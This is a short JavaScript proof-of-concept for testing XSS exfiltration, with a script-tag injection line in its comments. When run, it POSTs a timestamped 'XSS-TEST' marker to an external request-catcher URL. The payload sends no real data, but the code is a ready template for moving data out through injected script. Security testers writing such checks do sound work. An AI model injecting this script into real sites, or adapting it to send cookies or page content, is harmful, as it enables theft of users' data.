/**
 * Summary. Simple XSS Exfiltrate
 *
 * Description. Attempt to POST data to external site from external script
 *
 * @author JDL-84
 * @link https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js
 */

//<script src='https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js'/>

//Online POST Target
var Toilet = "https://ptsv2.com/t/qo33d-1598654477";

//Use Timestamp as identifier
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();

//Send Request to Toilet - Thirdparty POST catcher. 
function ExfiltrateData(ID)
{
	var Response = "";
	 var xhr = new XMLHttpRequest();
	 xhr.onreadystatechange = function() {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				 alert(xhr.responseText);
			}
		}
		 xhr.open('POST', Toilet+"/post", true);
		 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		 xhr.send("XSS-TEST-"+ID);		 
}

ExfiltrateData(TimeAsMS);
